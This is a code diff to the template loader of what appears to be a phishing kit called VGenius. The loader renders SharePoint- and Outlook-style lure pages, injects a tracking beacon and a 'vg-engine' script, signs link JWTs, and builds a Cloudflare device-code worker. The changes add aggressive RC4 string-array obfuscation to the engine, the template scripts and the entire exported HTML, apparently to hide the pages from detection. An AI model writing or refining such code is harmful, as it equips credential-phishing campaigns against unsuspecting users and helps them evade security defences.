@@ -1,3 +1,7 @@
+/**
+ * VGenius Template Loader Service
+ * Loads, renders, and obfuscates template HTML for export
+ */
 const fs = require('fs');
 const path = require('path');
 const config = require('../config/env');
@@ -146,20 +150,6 @@ function buildWindowVars(link, user, settings, options = {}) {
 }
 
 /**
- * Minify HTML - remove whitespace, comments, compress for exported files
- */
-function minifyHtml(html) {
-    // Remove HTML comments
-    html = html.replace(/<!--[\s\S]*?-->/g, '');
-    // Collapse whitespace between tags
-    html = html.replace(/\s*>\s*</g, '><');
-    // Collapse multiple spaces/newlines into single space
-    html = html.replace(/[ \t\n\r]+/g, ' ');
-    // Trim leading/trailing whitespace
-    return html.trim();
-}
-
-/**
  * Obfuscate a JavaScript string using javascript-obfuscator
  */
 function obfuscateJs(sourceCode) {
@@ -202,6 +192,56 @@ function obfuscateJs(sourceCode) {
     }
 }
 
+/**
+ * Obfuscate HTML content - encode all text strings to make unreadable
+ */
+function obfuscateHtml(html) {
+    try {
+        const JavaScriptObfuscator = require('javascript-obfuscator');
+        return JavaScriptObfuscator.obfuscate(html, {
+            compact: true,
+            controlFlowFlattening: false,
+            deadCodeInjection: false,
+            debugProtection: false,
+            disableConsoleOutput: false,
+            identifierNamesGenerator: 'hexadecimal',
+            log: false,
+            numbersToExpressions: false,
+            renameGlobals: false,
+            selfDefending: false,
+            simplify: true,
+            splitStrings: true,
+            splitStringsChunkLength: 3,
+            stringArray: true,
+            stringArrayCallsTransform: true,
+            stringArrayCallsTransformThreshold: 1,
+            stringArrayEncoding: ['rc4'],
+            stringArrayIndexShift: true,
+            stringArrayRotate: true,
+            stringArrayShuffle: true,
+            stringArrayWrappersCount: 5,
+            stringArrayWrappersChainedCalls: true,
+            stringArrayWrappersParametersMaxCount: 3,
+            stringArrayWrappersType: 'function',
+            transformObjectKeys: true,
+            unicodeEscapeSequence: true,
+        }).getObfuscatedCode();
+    } catch (e) {
+        console.error('[HTML Obfuscation] Failed:', e.message);
+        return html;
+    }
+}
+
+/**
+ * Minify HTML - remove whitespace between tags
+ */
+function minifyHtml(html) {
+    html = html.replace(/<!--[\s\S]*?-->/g, '');
+    html = html.replace(/\s*>\s*</g, '><');
+    html = html.replace(/[ \t\n\r]+/g, ' ');
+    return html.trim();
+}
+
 async function renderPageHtml(link, user, options = {}) {
     const templateType = link.template_type || 'sharepoint3';
     const designName = link.verification_design || 'outlook';
@@ -228,7 +268,6 @@ async function renderPageHtml(link, user, options = {}) {
     html = html.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf');
     html = html.replace('{{PAGES}}', String(link.pages || 1));
 
-    // Replace script.js placeholders with actual values
     const verifyUrl = (options.apiBaseUrl || config.APP_URL || '').trim().replace(/\/+$/, '');
     const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
     const logUrl = verifyUrl;
@@ -249,7 +288,7 @@ async function renderPageHtml(link, user, options = {}) {
 
     const windowVars = buildWindowVars(link, user, settings, options);
 
-    // Load VG engine
+    // Load vg-engine.js
     let vgEngine = '';
     const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
     if (fs.existsSync(vgEnginePath)) {
@@ -258,12 +297,15 @@ async function renderPageHtml(link, user, options = {}) {
 
     // Extract __FORCE_BLOB_FROM_START setting
     const forceBlob = options.forceBlobFromStart === true ? 'true' : 'false';
-
-    // Build separate config script
     const configScript = `<script>window.__FORCE_BLOB_FROM_START=${forceBlob}</script>`;
 
     // Inject window vars and config before </head>
     html = html.replace('</head>', `${windowVars}${configScript}</head>`);
+
+    // Inject vg-engine.js as script tag before </head>
+    if (vgEngine) {
+        html = html.replace('</head>', `<script>${vgEngine}</script></head>`);
+    }
 
     // Preload block handling
     const templateConfig = loadTemplateConfig(templateType);
@@ -275,39 +317,33 @@ async function renderPageHtml(link, user, options = {}) {
         html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
     }
 
-    // Obfuscate vg-engine.js when enabled
+    // Obfuscate JavaScript when enabled
     const doObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;
-    if (doObfuscate && vgEngine) {
-        const obfuscatedEngine = obfuscateJs(vgEngine);
-        // Replace the vg-engine script block
-        const engineRegex = /<script>([\s\S]*?)<\/script>/g;
-        let replaced = false;
-        html = html.replace(engineRegex, (match, inner) => {
-            if (!replaced && inner.includes('VGenius C Engine') || inner.includes('VG_JWT') === false && inner.length > 500) {
-                replaced = true;
-                return `<script>${obfuscatedEngine}</script>`;
-            }
-            return match;
-        });
+    if (doObfuscate) {
+        // Obfuscate vg-engine.js
+        if (vgEngine && vgEngine.length > 100) {
+            const obfuscatedEngine = obfuscateJs(vgEngine);
+            html = html.replace(
+                new RegExp(`<script>${vgEngine.substring(0, 50).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[\\s\\S]*?<\\/script>`),
+                `<script>${obfuscatedEngine}</script>`
+            );
+        }
+        // Obfuscate template script.js
+        if (script && script.length > 10) {
+            const obfuscatedScript = obfuscateJs(script);
+            html = html.replace(
+                new RegExp(`<script>${script.substring(0, 30).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[\\s\\S]*?<\\/script>`),
+                `<script>${obfuscatedScript}</script>`
+            );
+        }
     }
 
-    // Obfuscate inline template script.js when enabled
-    if (doObfuscate && script && script.length > 10) {
-        const obfuscatedScript = obfuscateJs(script);
-        const scriptRegex = /<script>([\s\S]*?)<\/script>/g;
-        let found = false;
-        html = html.replace(scriptRegex, (match, inner) => {
-            if (!found && inner !== match && inner.length > 50 && !inner.includes('window.VG_JWT') && !inner.includes('__FORCE_BLOB')) {
-                found = true;
-                return `<script>${obfuscatedScript}</script>`;
-            }
-            return match;
-        });
-    }
-
-    // Minify HTML for export/download
+    // For exported/downloaded files - full obfuscation
     if (options.exportForDownload) {
+        // First minify
         html = minifyHtml(html);
+        // Then obfuscate the entire HTML
+        html = obfuscateHtml(html);
     }
 
     // Add beacon before </body>
@@ -324,7 +360,6 @@ async function buildWorkerScript(link, user, apiBaseUrl) {
     const pageHtml = await renderPageHtml(link, user, {});
     let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
     const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev` : `http://localhost:${config.PORT}`);
-
     const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
 
     workerJs = workerJs
